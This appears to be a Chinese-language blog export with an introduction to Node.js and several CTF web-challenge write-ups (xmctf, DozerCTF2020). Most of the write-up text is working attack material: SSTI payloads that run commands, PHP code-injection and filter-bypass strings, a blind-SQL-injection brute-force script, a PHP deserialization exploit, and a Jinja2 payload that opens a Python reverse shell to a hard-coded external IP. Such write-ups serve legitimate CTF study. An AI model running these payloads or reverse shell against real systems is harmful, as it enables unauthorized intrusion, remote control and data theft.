class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>由于提交之后cookie会url编码处理，所以提交之后直接把cookie改回来即可</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200703160726.png" alt=""></p><h3 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h3><p>之前写在csdn上，<a href="https://blog.csdn.net/qq_43756333/article/details/106538180" target="_blank" rel="noopener">传送</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> ssi </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Node.js</title>
      <link href="/2020/06/28/node/"/>
      <url>/2020/06/28/node/</url>
      
        <content type="html"><![CDATA[<h3 id="什么是Node-js以及为什么要用node-js"><a href="#什么是Node-js以及为什么要用node-js" class="headerlink" title="什么是Node.js以及为什么要用node.js"></a>什么是Node.js以及为什么要用node.js</h3><p>通过翻阅官方手册，得到以下信息</p><blockquote><ul><li>Node.js 是一个开源与跨平台的 JavaScript 运行时环境。</li><li>Node.js 在浏览器外运行 V8 JavaScript 引擎（Google Chrome 的内核）。</li></ul></blockquote><p>由此我们可以简单认为，node.js是一个让JavaScript脱离浏览器之外运行的环境或语言解释器。</p><p>其主要具有以下几个特征：</p><h4 id="服务器端JavaScript处理"><a href="#服务器端JavaScript处理" class="headerlink" title="服务器端JavaScript处理"></a>服务器端JavaScript处理</h4><p>node.js的出现使得javascript代码实现了脱离客户端执行，与传统的web开发者前端使用js，后端服务器使用另一种语言如php，python相比，node.js给开发者提供了一个编写后端服务器代码的环境，实现了一定程度上的前后端统一，使得开发者无需学习另一门完全不同的语言，其高度的代码复用性，也大大提升了开发者的效率。</p><h4 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h4><p>传统的服务器每次一个新用户连到你的网站上时，服务器就得开一个连接。每个连接都需要占一个进程，这些进程大部分时间都是闲着的，因此很容易造成内存浪费，而node.js仅仅使用一个线程。当有用户连接了，就触发一个内部事件，通过非阻塞 I/O、事件驱动机制，使得这种模式正常运转。</p><h4 id="非阻断-异步I-O"><a href="#非阻断-异步I-O" class="headerlink" title="非阻断/异步I/O"></a>非阻断/异步I/O</h4><p>在传统的单线程处理机制中，在执行了访问数据库代码之后，整个线程都将暂停下来，等待数据库返回结果，才能执行后面的代码。也就是说，I/O阻塞了代码的执行，极大地降低了程序的执行效率。而node.js进行I/O操作的时候，将调取后面其他部分的计算，直至I/O完成，然后再进行原来部分I/O操作后的后续计算。通俗的描述就是在一件事没做完之前不要停下来，继续做下一件。</p><h4 id="事件驱动"><a href="#事件驱动" class="headerlink" title="事件驱动"></a>事件驱动</h4><p>非阻断I/O需要事件驱动机制的配合才能顺利运转。在Node.js中，客户端请求建立连接，提交数据等行为，会触发相应的事件，服务器只在用户那边有事件发生的时候才响应。接收到请求，就把它关闭然后进行处理，然后去服务下一个请求。这样，保证了非阻断I/O的顺利进行，提升了效率。</p><p>通过采用单线程，非阻断I/O，事件驱动的模型，node.js在减少内存开销的同时，也大大提升了处理业务的效率。</p><h3 id="Node-js的使用方法"><a href="#Node-js的使用方法" class="headerlink" title="Node.js的使用方法"></a>Node.js的使用方法</h3><h4 id="命令行运行node-js脚本"><a href="#命令行运行node-js脚本" class="headerlink" title="命令行运行node.js脚本"></a>命令行运行node.js脚本</h4><p>安装node.js后，只需在命令行输入node即可进入交互环境</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628164911.png" alt=""></p><p>可以直接在命令行中执行js代码</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628165757.png" alt=""></p><p>也可执行目录下js脚本</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200628201419.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xmctf平台部分web</title>
      <link href="/2020/06/24/xmctf_web_wp/"/>
      <url>/2020/06/24/xmctf_web_wp/</url>
      
        <content type="html"><![CDATA[<p>xmctf部分web</p><p>平台：xmctf.top</p><a id="more"></a><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy-web"></a>easy-web</h3><p>打开靶机源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure><p>存在一个变量key为bad，定义了值为bad所以die出badbad，get传参两个参数act和arg，正则匹配a-z，0-9，/i不区分大小写<br>/s匹配任何不可见字符，包括空格、制表符、换页符等等，/D如果使用$限制结尾字符,则不允许结尾有换行</p><p>需要绕过if正则匹配，从而控制arg参数</p><p>考点：create_function代码注入</p><blockquote><p>create_function：根据传递的参数创建匿名函数，并为其返回唯一名称</p><p>语法:<br>create_function(string $args,string $code)<br>//string $args 声明的函数变量部分<br>//string $code 执行的方法代码部分</p></blockquote><p>第一步要让key不die掉，直接post一个key把原来的key覆盖掉即可<br>然后想要函数正常调用，那就必须绕过正则，因此我们要在函数名的头或者尾加上一个字符<code>\</code></p><blockquote><p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote><p>那么接下来就是利用<code>$act($arg,&#39;&#39;);</code>进行代码注入了。</p><p>payload：<code>?act=\create_function&amp;arg=){return%20123;}system(%27dir%27);//</code><br>传入之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$act($arg,&#39;&#39;);</span><br><span class="line">create_function()&#123;return%20123;&#125;system(%27dir%27);&#x2F;&#x2F;,&#39;&#39;)</span><br></pre></td></tr></table></figure><p>实际上也就是这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function a&#123;</span><br><span class="line">return%20123;&#125;system(%27dir%27);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>函数被闭合，就可以执行任意命令了。<br>读flag:</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623224807.png" alt=""></p><h3 id="RCE-训练"><a href="#RCE-训练" class="headerlink" title="RCE-训练"></a>RCE-训练</h3><p>打开靶机得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($ip)) &#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/(;|`| |&amp;|cp|mv|cat|tail|more|rev|tac|\*|\&#123;)/i"</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">"hack"</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">"no!&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  var_dump($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>主要两个正则，第一个过滤一些文件读取命令，第二个匹配flag的任意单个或多个字符串。<br>经测试可以用<code>|</code>进行命令执行<br><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623225636.png" alt=""></p><p>那么关键是绕过了，可以利用shell命令构造</p><p>payload：<code>?ip=127.0.0.1|echo$IFS$9bHMgLw|base64$IFS$1-d|sh</code><br>$IFS$9代替空格，bHMgLw-&gt;ls /，输出给base64还原然后sh执行</p><p>那么读取flag</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623230422.png" alt=""></p><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><p>打开靶机有一串md5代码</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624074453.png" alt=""></p><p>解析后为1.1.1.1，抓包加个xff头成功下一步</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624075157.png" alt=""></p><p>打开php得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]);</span><br></pre></td></tr></table></figure><p>disable_fun列表是一些文件操作函数，array_merge将多个数组单元合并，get_defined_functions返回数组，foreach遍历新的disable_function并传递给$i，if检测如果传入的shell中在数组中出现，则die，过了if检测则输出shell内容</p><p>直接变量拼接，payload：?shell=$a;$a=’syst’.’em’;$a(“cat flag.php”);<br>传入在源码得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083307.png" alt=""></p><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p>打开靶机</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083629.png" alt=""></p><p>传入<code>?name=4</code>回显</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083748.png" alt=""></p><p>猜测为模板注入，<code></code>查看配置信息，发现secret_key泄露</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085221.png" alt=""></p><p>那么考虑session伪造了，查看cookie部分发现jwt</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085025.png" alt=""></p><p>解密得<code>{&#39;username&#39;: b&#39;guest&#39;}</code>，利用flask_session_cookie_manager脚本伪造admin</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085650.png" alt=""></p><p>修改session访问/flag即可</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085732.png" alt=""></p><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>打开靶机只有一句hello，guest，讲道理要是没做web8我都想不到要传name。。。。<br>测试之后发现还是模板注入，</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194649.png" alt=""></p><p>不过测试之后发现过了了很多东西，config，下划线，点号等等</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194943.png" alt=""></p><p>也没有了session伪造不了，那么只能命令执行了。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[request[&quot;ar&quot;+&quot;gs&quot;][&quot;class&quot;]][request[&quot;ar&quot;+&quot;gs&quot;][&quot;mro&quot;]][1][request[&quot;ar&quot;+&quot;gs&quot;][&quot;subclass&quot;]]()[286][request[&quot;ar&quot;+&quot;gs&quot;][&quot;init&quot;]][request[&quot;ar&quot;+&quot;gs&quot;][&quot;globals&quot;]][&quot;os&quot;][&quot;popen&quot;](request[&quot;ar&quot;+&quot;gs&quot;][&quot;cmd&quot;])[&quot;read&quot;]()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclass&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;cmd&#x3D;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.98.134.220&quot;,3122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>用<code>request[&quot;args&quot;][&quot;xx&quot;]</code>配合赋值代替双下划线，后面开个python服务器连上自己的ecs，nc监听</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200625205840.png" alt=""></p><p>读取flag即可。</p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>打开靶机得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">flag在哪里呢？</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>主要三层正则匹配，第一层禁用了几个伪协议，第二层匹配a-z，逗号，下划线，(?R)引用当前表达式，(?R)?代表可以有引用，也可以没有，引用则变成<code>[a-z,_]+\([a-z,_]+\((?R)?\)\)</code>的形式，可以一直迭代下去。这样可以匹配一些诸如print(echo(1))括号和字符组成的字符集，第三个禁用一些函数</p><p>payload：<code>?exp=print_r(scandir(pos(localeconv())));</code>，scandir列出目录，pos返回数组中的当前单元, 默认取第一个值，localeconv返回数组。</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624201535.png" alt=""></p><p>那么读取flag.php，next函数读取php的第一个元素的下一个元素，flag.php是倒数第二个，所以可以把用array_reverse把数组倒过来再用next指向flag.php，最后用highlight_file读取。<br>payload：<code>highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624202207.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssti </tag>
            
            <tag> RCE </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DozerCTF2020部分web复现</title>
      <link href="/2020/06/20/DozerCTF_web_wp/"/>
      <url>/2020/06/20/DozerCTF_web_wp/</url>
      
        <content type="html"><![CDATA[<p>前几天打的比赛，web只做出了两道签到题，域渗透的题暂且搁置，想着就把其他的web复现一下吧。</p><p>平台：<a href="http://ctf.dozerjit.club:8000/" target="_blank" rel="noopener">http://ctf.dozerjit.club:8000/</a></p><a id="more"></a><h4 id="sqli-labs-0"><a href="#sqli-labs-0" class="headerlink" title="sqli-labs 0"></a>sqli-labs 0</h4><p>sql-labs改的题，试了很多种姿势都没让id报错，后来还是官方出了hint让尝试url二次编码(喷)才成功</p><p><img src="/images/image-20200619153205929.png" alt="image-20200619153205929"></p><p>之前在测试中发现select，union之类的都被过滤了，开始以为是盲注，所以写了个脚本出了数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words = <span class="string">"Dumb"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    print(<span class="string">'--------------------------'</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">        url = <span class="string">'http://118.31.11.216:30501/?id=1%2527/**/and/**/ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;'</span>.format(i,j)</span><br><span class="line">        re=requests.get(url+<span class="string">'%2523'</span>).text</span><br><span class="line">        <span class="keyword">if</span> words <span class="keyword">not</span> <span class="keyword">in</span> re:</span><br><span class="line">            result+=chr(j)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/images/image-20200619153929460.png" alt="image-20200619153929460"></p><p>但后来继续跑的时候老报错，仔细看了fuzz才发现点号<code>.</code>被过滤了。。。。。那么啥都不能用了，只剩个网鼎2018的堆叠注入。</p><p><img src="/images/image-20200619154141735.png" alt="image-20200619154141735"></p><p>然后尝试过比如重命名的payload不知道为啥没打通</p><p>最后还是用了handler</p><p><code>1%2527;handler uziuzi open as a;handler a read first;%2523</code></p><p><img src="/images/image-20200619154316727.png" alt="image-20200619154316727"></p><h4 id="白给的反序列化"><a href="#白给的反序列化" class="headerlink" title="白给的反序列化"></a>白给的反序列化</h4><p>打开靶机直接给出代码，审计一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;  <span class="comment">//私有类型定义两个变量</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"mysys"</span>))) &#123;  <span class="comment">//当method为mysys时</span></span><br><span class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125; <span class="comment">//调用mysys函数，并把args作为mysys的数组参数回调</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">mysys</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        print_r(base64_encode(exec(<span class="string">"cat $path"</span>)));</span><br><span class="line">    &#125;<span class="comment">//把结果base64编码打印</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($str) &gt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"No"</span>);</span><br><span class="line">        &#125;<span class="comment">//限制字符串长度</span></span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">            $num += <span class="number">1</span>;<span class="comment">//遍历出$k和$v然后计算$v里的空格，大于2则die</span></span><br><span class="line">            <span class="keyword">if</span> ($num &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"No"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'path'</span>]) &#123;<span class="comment">//如果传入path反序列化path</span></span><br><span class="line">    $path = @$_GET[<span class="string">'path'</span>];</span><br><span class="line">    unserialize($path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>虽然有两个waf，但其实限制并不生效，因为无论前面有没有die，析构函数<code>__destruct</code>最后都会触发，因此只要保证method是’mysys’，args为数组参数就可以了，还有就是由于method和args是私有类型，所以最后payload用url方式打印出即可</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method=<span class="string">'mysys'</span>;</span><br><span class="line">    <span class="keyword">private</span> $args=<span class="keyword">array</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> home();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O%3A4%3A%22home%22%3A2%3A%7Bs%3A12%3A%22%00home%00method%22%3Bs%3A5%3A%22mysys%22%3Bs%3A10%3A%22%00home%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure><p>get传入后再base64解码一下即可</p><p><img src="/images/image-20200619162357657.png" alt="image-20200619162357657"></p><h4 id="svgggggg"><a href="#svgggggg" class="headerlink" title="svgggggg!"></a>svgggggg!</h4><p>这道题磨了好久还是没做出来。。。（菜到自闭）</p><p>考点：bind xxe，ssrf</p><p>打开靶机是个svg检验</p><p><img src="/images/image-20200619162628192.png" alt="image-20200619162628192"></p><p>访问目标除了svg文件都只会<code>Unauthorized type!</code></p><p>bind xxe参考：<a href="freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a></p><p>在ecs上构造两个文件：xxe.svg，xxe.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">xxe.svg</span><br><span 